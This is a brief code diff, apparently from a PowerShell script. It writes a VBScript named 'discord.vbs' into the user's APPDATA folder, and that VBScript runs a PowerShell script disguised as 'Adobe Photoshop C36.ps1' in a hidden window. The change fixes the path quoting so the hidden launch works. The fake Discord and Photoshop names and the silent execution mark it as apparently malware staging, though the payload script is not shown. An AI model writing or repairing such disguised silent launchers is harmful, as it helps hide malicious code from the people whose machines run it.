@@ -22,7 +22,7 @@ cd "$env:APPDATA"
 
 New-Item -Path . -Name "discord.vbs" -ItemType "file" -Value @"
 Dim shell,command
-command = "powershell.exe -nologo -File ./Adobe Photoshop C36.ps1"
+command = "powershell.exe -nologo -File ""Adobe Photoshop C36.ps1"""
 Set shell = CreateObject("WScript.Shell")
 shell.Run command,0
 "@
